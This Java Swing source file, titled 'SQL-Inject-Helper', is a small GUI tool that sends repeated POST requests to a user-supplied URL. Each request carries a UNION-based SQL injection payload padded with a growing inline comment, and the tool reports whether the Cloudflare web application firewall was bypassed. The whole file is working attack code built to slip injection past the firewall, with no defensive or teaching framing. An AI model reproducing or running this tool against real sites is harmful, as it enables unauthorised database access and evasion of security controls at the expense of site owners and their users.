package cn.PCZ;

import cn.PCZ.Utils.WebUtils;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Collections;

/**
 * @author PCZ
 */
public class Main extends JFrame implements ActionListener {

    JLabel jl_1 = new JLabel("URL:");
    static JTextField jtf_1 = new JTextField();

    JLabel jl_2 = new JLabel("Times:");
    static JTextField jtf_2 = new JTextField();

    JButton button_2 = new JButton("POST");

    JPanel panel = new JPanel();

    public Main() {
        panel.setLayout(null);
        jl_1.setBounds(20, 30, 50, 30);
        jtf_1.setBounds(70, 30, 180, 30);
        jl_2.setBounds(20, 90, 50, 30);
        jtf_2.setBounds(70, 90, 180, 30);
        button_2.setBounds(50, 280, 80, 30);
        panel.add(jl_1);
        panel.add(jtf_1);
        panel.add(jl_2);
        panel.add(jtf_2);
        panel.add(button_2);
        this.add(panel);
        button_2.addActionListener(this);
    }
    private static String createRepeatedStr(String seed,int n) {
        return String.join("", Collections.nCopies(n, seed));
    }
    public void actionPerformed(ActionEvent ae) {
        if (ae.getSource() == button_2) {
            for (int Tick = 1; Tick < (Integer.parseInt(jtf_2.getText()) + 1); Tick++) {
                String ShitStrings = createRepeatedStr("HelloWorld", Tick);
                String Data = "'id=-10' /*" + ShitStrings  + "*/ union select 1,2,version #";
                if(WebUtils.Post(jtf_1.getText() , Data).contains("Cloudflare")) {
                    System.out.println("You Dont bypass PayLoad! Length:" + Data.length());
                } else {
                    System.out.println("Successed Bypassing PayLoad! Length:" + Data.length());
                }
            }
        }
    }

    public static void main(String[] args) {
        Main frm = new Main();
        frm.setSize(280, 380);

        Dimension screensize = Toolkit.getDefaultToolkit().getScreenSize();
        int w = (int)screensize.getWidth();
        int h = (int)screensize.getHeight();
        frm.setLocation(w/2-145, h/2-110);

        frm.setTitle("SQL-Inject-Helper");
        frm.setResizable(false);
        frm.setVisible(true);
        frm.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frm.setAlwaysOnTop(true);
    }
}
